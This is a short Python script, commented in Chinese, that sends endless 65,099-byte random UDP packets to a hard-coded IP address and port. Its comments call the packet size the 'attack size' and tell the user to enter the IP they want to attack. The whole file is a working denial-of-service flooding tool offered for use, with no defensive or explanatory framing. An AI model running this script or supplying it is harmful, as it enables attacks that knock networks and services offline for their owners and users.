# python3
import os
import socket
import random
from datetime import datetime
 
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# 数字是攻击大小，过大会报错
bytes = random._urandom(65099)
# 输入你要攻击的IP
ip = "192.168.2.125"
# 输入端口号
port = 2121
 
os.system("clear")
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    print("已发送 %s 个数据包到 %s 端口 %d" % (sent, ip, port))